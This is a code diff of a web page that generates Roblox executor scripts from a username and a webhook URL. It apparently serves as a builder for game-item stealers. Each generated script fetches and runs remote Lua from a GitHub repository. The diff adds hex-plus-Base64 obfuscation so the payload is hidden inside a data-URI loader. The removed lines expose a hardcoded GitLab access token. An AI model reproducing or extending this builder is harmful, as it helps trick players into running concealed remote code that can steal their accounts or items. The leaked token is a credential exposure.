@@ -55,71 +55,57 @@
     <div class="container">
         <input type="text" id="username" placeholder="Enter your Username" value="void6674109">
         <input type="text" id="webhook" placeholder="Enter Webhook URL">
-        <select id="script-select">
-            <option value="Blox Fruits">Blox Fruits</option>
-            <option value="Pet Simulator 99">Pet Simulator 99</option>
-            <option value="Pls Donate">Pls Donate</option>
-        </select>
-        <button onclick="generateScript()">Generate & Upload</button>
+        <button onclick="generateScript()">Generate Script</button>
     </div>
 
     <script>
-        // ✅ Fixed PAT and Project ID
-        const PAT = 'glpat-8si5orFgbXbJE4uzHwKS';
-        const PROJECT_ID = '67450323';
-
-        // ✅ Loadstrings (Adopt Me & MM2 removed)
+        // Loadstrings for different games
         let loadstrings = {
             "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
             "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
             "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
         };
 
-        // Main generate script function
+        // Function to encode to Hex
+        function hexEncode(script) {
+            return script.split('').map(c => c.charCodeAt(0).toString(16)).join('');
+        }
+
+        // Function to Base64 encode
+        function base64Encode(str) {
+            return btoa(unescape(encodeURIComponent(str)));
+        }
+
+        // Combine Hex + Base64 for strong obfuscation
+        function obfuscateScript(script) {
+            let hex = hexEncode(script);
+            return base64Encode(hex);
+        }
+
+        // Generate and upload script
         function generateScript() {
             let username = document.getElementById('username').value;
             let webhook = document.getElementById('webhook').value;
-            let selectedScript = document.getElementById('script-select').value;
 
             if (!username || !webhook) {
                 alert("Please enter both Username and Webhook URL!");
                 return;
             }
 
-            // ✅ Script format
-            let script = `Username = "${username}"\nWebhook = "${webhook}"\n\n${loadstrings[selectedScript]}`;
+            let selectedScript = loadstrings["Blox Fruits"]; // Fixed to Blox Fruits or change as needed
 
-            // Upload to GitLab
-            uploadToGitLab(script, selectedScript);
-        }
+            let rawScript = `Username = "${username}"\nWebhook = "${webhook}"\n${selectedScript}`;
+            let obfuscatedScript = obfuscateScript(rawScript);
 
-        // GitLab Upload Function
-        function uploadToGitLab(content, scriptName) {
-            let filename = `${scriptName.replace(/\s+/g, '')}.lua`; // Clean filename
+            // Final loadstring for Roblox Executor
+            let finalScript = `loadstring(game:HttpGet("data:text/plain;base64,${obfuscatedScript}"))()`;
 
-            fetch(`https://gitlab.com/api/v4/projects/${encodeURIComponent(PROJECT_ID)}/repository/files/${encodeURIComponent(filename)}`, {
-                method: 'POST',
-                headers: {
-                    'PRIVATE-TOKEN': PAT, // ✅ Using your PAT directly
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    branch: 'main', // Ensure 'main' exists
-                    content: btoa(content), // Encode script to base64
-                    commit_message: `Add ${scriptName} script`
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.file_path) {
-                    alert("✅ Script uploaded successfully to GitLab!");
-                } else {
-                    alert("❌ Failed to upload. Check your details.");
-                }
-            })
-            .catch(error => {
-                console.error('Error uploading:', error);
-                alert("⚠️ Error uploading script! Check console for details.");
+            // Copy to clipboard automatically
+            navigator.clipboard.writeText(finalScript).then(() => {
+                alert("Obfuscated script copied to clipboard!");
+            }).catch(err => {
+                console.error('Error copying:', err);
+                alert("Failed to copy script.");
             });
         }
     </script>
